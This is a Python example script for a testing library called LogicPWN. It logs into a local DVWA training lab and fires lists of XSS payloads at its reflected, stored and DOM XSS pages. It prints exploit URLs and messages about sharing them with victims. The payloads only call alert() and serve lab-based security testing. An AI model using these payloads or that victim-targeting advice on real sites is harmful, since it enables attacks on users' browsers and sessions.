#!/usr/bin/env python3
"""
LogicPWN DVWA XSS Complete Testing Example
This example demonstrates comprehensive XSS testing against DVWA:
1. Reflected XSS - URL parameter injection
2. Stored XSS - Persistent payload in database
3. DOM XSS - Client-side JavaScript vulnerability

Prerequisites: DVWA running on localhost:8080 with admin/admin login
Run: docker run -d -p 8080:80 vulnerables/web-dvwa:latest
"""

import asyncio
import re
import urllib.parse
from logicpwn.core.runner import AsyncRequestRunner

async def dvwa_login():
    """Login to DVWA and return session cookie"""
    print("🔐 Logging into DVWA...")
    
    async with AsyncRequestRunner() as runner:
        try:
            # Get login page and extract CSRF token
            response = await runner.send_request("http://localhost:8080/login.php")
            
            csrf_token = None
            token_match = re.search(r'user_token["\']?\s*value=["\']([^"\']+)', response.body)
            if token_match:
                csrf_token = token_match.group(1)
                print(f"   🛡️  Found CSRF token: {csrf_token[:20]}...")
            
            # Login with admin/admin
            login_data = {
                "username": "admin",
                "password": "admin",
                "Login": "Login"
            }
            
            if csrf_token:
                login_data["user_token"] = csrf_token
            
            login_response = await runner.send_request(
                "http://localhost:8080/login.php",
                method="POST",
                data=login_data
            )
            
            # Extract session cookie
            set_cookie = login_response.headers.get("Set-Cookie", "")
            cookie_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
            if cookie_match:
                session_cookie = cookie_match.group(1)
                print(f"   ✅ Login successful! Session: {session_cookie[:20]}...")
                return session_cookie
            else:
                print("   ❌ Login failed - no session cookie found")
                return None
                
        except Exception as e:
            print(f"   ❌ Login error: {e}")
            return None

async def test_reflected_xss(session_cookie):
    """Test Reflected XSS vulnerability"""
    print("\n🎯 Testing Reflected XSS")
    print("=" * 50)
    
    if not session_cookie:
        print("❌ No valid session - skipping test")
        return
    
    headers = {"Cookie": f"PHPSESSID={session_cookie}"}
    
    async with AsyncRequestRunner() as runner:
        try:
            # Step 1: Access reflected XSS page
            xss_url = "http://localhost:8080/vulnerabilities/xss_r/"
            response = await runner.send_request(xss_url, headers=headers)
            
            if response.status_code != 200:
                print("❌ Cannot access reflected XSS page")
                return
            
            print("✅ Accessed reflected XSS page")
            
            # Step 2: Test various XSS payloads
            payloads = [
                "<script>alert('Reflected XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<script>prompt('Reflected XSS')</script>"
            ]
            
            vulnerable_payloads = []
            
            for i, payload in enumerate(payloads, 1):
                print(f"\n   {i}. Testing payload: {payload[:30]}...")
                
                # Send payload via GET parameter
                test_response = await runner.send_request(
                    xss_url,
                    method="GET",
                    params={"name": payload},
                    headers=headers
                )
                
                if test_response.status_code == 200:
                    # Check if payload is reflected without encoding
                    if payload in test_response.body:
                        print(f"      🚨 VULNERABLE! Payload reflected unencoded")
                        vulnerable_payloads.append(payload)
                        
                        # Generate exploit URL
                        encoded_payload = urllib.parse.quote(payload)
                        exploit_url = f"{xss_url}?name={encoded_payload}"
                        print(f"      🔗 Exploit URL: {exploit_url}")
                        
                    elif "&lt;" in test_response.body or "&gt;" in test_response.body:
                        print(f"      🛡️  Payload encoded - likely protected")
                    else:
                        print(f"      ❓ Payload not found in response")
                else:
                    print(f"      ❌ Request failed: {test_response.status_code}")
            
            # Summary
            if vulnerable_payloads:
                print(f"\n   🚨 REFLECTED XSS FOUND!")
                print(f"   📊 {len(vulnerable_payloads)}/{len(payloads)} payloads successful")
                print(f"   💡 Share exploit URLs with victims to execute XSS")
            else:
                print(f"\n   🛡️  No reflected XSS vulnerabilities found")
                
        except Exception as e:
            print(f"❌ Reflected XSS test error: {e}")

async def test_stored_xss(session_cookie):
    """Test Stored XSS vulnerability"""
    print("\n🎯 Testing Stored XSS")
    print("=" * 50)
    
    if not session_cookie:
        print("❌ No valid session - skipping test")
        return
    
    headers = {"Cookie": f"PHPSESSID={session_cookie}"}
    
    async with AsyncRequestRunner() as runner:
        try:
            # Step 1: Access stored XSS page
            xss_url = "http://localhost:8080/vulnerabilities/xss_s/"
            response = await runner.send_request(xss_url, headers=headers)
            
            if response.status_code != 200:
                print("❌ Cannot access stored XSS page")
                return
            
            print("✅ Accessed stored XSS page")
            
            # Step 2: Submit XSS payload to guestbook
            payloads_to_test = [
                {
                    "name": "LogicPWN Test",
                    "message": "<script>alert('Stored XSS by LogicPWN')</script>"
                },
                {
                    "name": "XSS Test",
                    "message": "<script>prompt('Stored XSS')</script>"
                },
                {
                    "name": "IMG Test",
                    "message": "<img src=x onerror=alert('Stored XSS')>"
                }
            ]
            
            for i, payload_data in enumerate(payloads_to_test, 1):
                print(f"\n   {i}. Testing stored payload: {payload_data['message'][:30]}...")
                
                # Submit payload to guestbook
                submit_response = await runner.send_request(
                    xss_url,
                    method="POST",
                    data={
                        "txtName": payload_data["name"],
                        "mtxMessage": payload_data["message"],
                        "btnSign": "Sign Guestbook"
                    },
                    headers=headers
                )
                
                if submit_response.status_code == 200:
                    print(f"      ✅ Payload submitted successfully")
                    
                    # Check if payload is stored and reflected
                    if payload_data["message"] in submit_response.body:
                        print(f"      🚨 VULNERABLE! Stored XSS payload persisted")
                        print(f"      💾 Payload will execute for all visitors")
                        
                        # Test persistence by revisiting page
                        revisit_response = await runner.send_request(xss_url, headers=headers)
                        if payload_data["message"] in revisit_response.body:
                            print(f"      🔄 CONFIRMED: Payload persists across visits")
                        
                    else:
                        print(f"      🛡️  Payload not found - likely filtered/encoded")
                else:
                    print(f"      ❌ Submission failed: {submit_response.status_code}")
            
            print(f"\n   💡 Stored XSS is persistent - payloads execute for all users")
            print(f"   ⚠️  Check the guestbook page for executed payloads")
                
        except Exception as e:
            print(f"❌ Stored XSS test error: {e}")

async def test_dom_xss(session_cookie):
    """Test DOM-based XSS vulnerability"""
    print("\n🎯 Testing DOM XSS")
    print("=" * 50)
    
    if not session_cookie:
        print("❌ No valid session - skipping test")
        return
    
    headers = {"Cookie": f"PHPSESSID={session_cookie}"}
    
    async with AsyncRequestRunner() as runner:
        try:
            # Step 1: Access DOM XSS page
            xss_url = "http://localhost:8080/vulnerabilities/xss_d/"
            response = await runner.send_request(xss_url, headers=headers)
            
            if response.status_code != 200:
                print("❌ Cannot access DOM XSS page")
                return
            
            print("✅ Accessed DOM XSS page")
            
            # Step 2: Analyze the page for URL parameter usage
            if "default=" in response.body or "document.location" in response.body:
                print("   🔍 Found potential DOM manipulation code")
            
            # Step 3: Test DOM XSS payloads via URL parameters
            dom_payloads = [
                "<script>alert('DOM XSS')</script>",
                "<img src=x onerror=alert('DOM XSS')>",
                "<svg onload=alert('DOM XSS')>",
                "javascript:alert('DOM XSS')",
                "<iframe src=javascript:alert('DOM XSS')></iframe>"
            ]
            
            for i, payload in enumerate(dom_payloads, 1):
                print(f"\n   {i}. Testing DOM payload: {payload[:30]}...")
                
                # Test with default parameter (common in DOM XSS)
                test_response = await runner.send_request(
                    xss_url,
                    method="GET",
                    params={"default": payload},
                    headers=headers
                )
                
                if test_response.status_code == 200:
                    # For DOM XSS, we look for the payload in JavaScript context
                    if payload in test_response.body:
                        print(f"      🚨 POTENTIAL DOM XSS! Payload in DOM context")
                        
                        # Generate exploit URL
                        encoded_payload = urllib.parse.quote(payload)
                        exploit_url = f"{xss_url}?default={encoded_payload}"
                        print(f"      🔗 DOM XSS URL: {exploit_url}")
                        print(f"      💡 This executes via client-side JavaScript")
                        
                    else:
                        print(f"      🛡️  Payload not found in DOM context")
                
                # Also test with other common DOM parameters
                for param in ["lang", "page", "url", "redirect"]:
                    param_response = await runner.send_request(
                        xss_url,
                        method="GET",
                        params={param: payload},
                        headers=headers
                    )
                    
                    if param_response.status_code == 200 and payload in param_response.body:
                        print(f"      🚨 DOM XSS via {param} parameter!")
                        exploit_url = f"{xss_url}?{param}={urllib.parse.quote(payload)}"
                        print(f"      🔗 Exploit URL: {exploit_url}")
            
            print(f"\n   💡 DOM XSS vulnerabilities execute in victim's browser")
            print(f"   🎯 Share malicious URLs to exploit DOM XSS")
                
        except Exception as e:
            print(f"❌ DOM XSS test error: {e}")

async def generate_xss_report(session_cookie):
    """Generate comprehensive XSS testing report"""
    print("\n📊 XSS Testing Report")
    print("=" * 50)
    
    print("🎯 DVWA XSS Vulnerability Assessment Complete")
    print()
    print("📋 Tested Vulnerability Types:")
    print("   1. ✅ Reflected XSS - URL parameter injection")
    print("   2. ✅ Stored XSS - Persistent database payload")
    print("   3. ✅ DOM XSS - Client-side JavaScript execution")
    print()
    print("🔗 Example Exploit URLs Generated:")
    print("   • Reflected: http://localhost:8080/vulnerabilities/xss_r/?name=<payload>")
    print("   • Stored: Visit guestbook after payload submission")
    print("   • DOM: http://localhost:8080/vulnerabilities/xss_d/?default=<payload>")
    print()
    print("⚠️  Impact Assessment:")
    print("   • Reflected XSS: Requires social engineering to share URLs")
    print("   • Stored XSS: Affects all users visiting the page")
    print("   • DOM XSS: Executes purely client-side via URL manipulation")
    print()
    print("🛡️  Mitigation Recommendations:")
    print("   • Input validation and output encoding")
    print("   • Content Security Policy (CSP)")
    print("   • HTML sanitization")
    print("   • Secure coding practices")

async def main():
    """Run complete DVWA XSS testing suite"""
    print("🎯 LogicPWN DVWA XSS Complete Testing Suite")
    print("=" * 60)
    print("Comprehensive XSS testing: Reflected, Stored, and DOM")
    print()
    
    # Check DVWA availability
    async with AsyncRequestRunner() as runner:
        try:
            response = await runner.send_request("http://localhost:8080")
            if response.status_code != 200:
                print("❌ DVWA not accessible on localhost:8080")
                print("💡 Run: docker run -d -p 8080:80 vulnerables/web-dvwa:latest")
                return
        except Exception as e:
            print(f"❌ Cannot connect to DVWA: {e}")
            return
    
    print("✅ DVWA accessible - starting XSS testing")
    
    # Login to DVWA
    session_cookie = await dvwa_login()
    if not session_cookie:
        print("❌ Cannot login to DVWA - check setup")
        return
    
    # Run all XSS tests
    await test_reflected_xss(session_cookie)
    await test_stored_xss(session_cookie)
    await test_dom_xss(session_cookie)
    
    # Generate report
    await generate_xss_report(session_cookie)
    
    print("\n🎉 DVWA XSS testing completed!")
    print("\nNext steps:")
    print("- Test different DVWA security levels")
    print("- Try advanced XSS payloads and bypasses")
    print("- Explore other DVWA vulnerabilities")

if __name__ == "__main__":
    asyncio.run(main())
